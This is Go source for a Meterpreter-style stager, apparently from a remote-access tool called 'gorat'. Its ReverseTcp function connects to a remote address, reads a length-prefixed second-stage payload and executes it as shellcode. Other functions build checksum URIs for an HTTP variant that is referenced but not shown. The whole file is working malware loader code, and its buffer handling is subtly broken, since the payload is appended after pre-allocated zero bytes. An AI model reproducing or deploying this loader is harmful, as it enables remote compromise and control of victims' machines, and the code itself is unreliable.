package meterpreter

import (
	"encoding/binary"
	"math/rand"
	"net"
	"runtime"
	"time"

	"github.com/krishpranav/gorat/shell"
)

func Meterpreter(connType, address string) (bool, error) {
	var (
		ok  bool
		err error
	)
	switch {
	case connType == "http" || connType == "https":
		ok, err = ReverseHttp(connType, address)
	case connType == "tcp":
		ok, err = ReverseTcp(address)
	default:
		ok = false
	}

	return ok, err
}

func GetRandomString(length int, charset string) string {
	var seed *rand.Rand = rand.New(rand.NewSource(time.Now().UnixNano()))
	buf := make([]byte, length)
	for i := range buf {
		buf[i] = charset[seed.Intn(len(charset))]
	}
	return string(buf)
}

func GetURIChecksumId() int {
	var res int = 0
	switch runtime.GOOS {
	case "windows":
		res = 92
	case "linux":
		res = 95
	default:
		res = 92
	}
	return res
}

func GenerateURIChecksum(length int) string {
	var charset string = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-"
	for {
		var checksum int = 0
		var uriString string

		uriString = GetRandomString(length, charset)
		for _, value := range uriString {
			checksum += int(value)
		}
		if (checksum % 0x100) == GetURIChecksumId() {
			return uriString
		}
	}
}

func ReverseTcp(address string) (bool, error) {
	var (
		stage2LengthBuf []byte = make([]byte, 4)
		tmpBuf          []byte = make([]byte, 2048)
		read            int    = 0
		totalRead       int    = 0
		stage2LengthInt uint32 = 0
		conn            net.Conn
		err             error
	)

	if conn, err = net.Dial("tcp", address); err != nil {
		return false, err
	}

	defer conn.Close()

	if _, err = conn.Read(stage2LengthBuf); err != nil {
		return false, err
	}

	stage2LengthInt = binary.LittleEndian.Uint32(stage2LengthBuf[:])
	stage2Buf := make([]byte, stage2LengthInt)

	for totalRead < (int)(stage2LengthInt) {
		if read, err = conn.Read(tmpBuf); err != nil {
			return false, err
		}
		totalRead += read
		stage2Buf = append(stage2Buf, tmpBuf[:read]...)
	}

	shell.ExecShellcode(stage2Buf)

	return true, nil
}
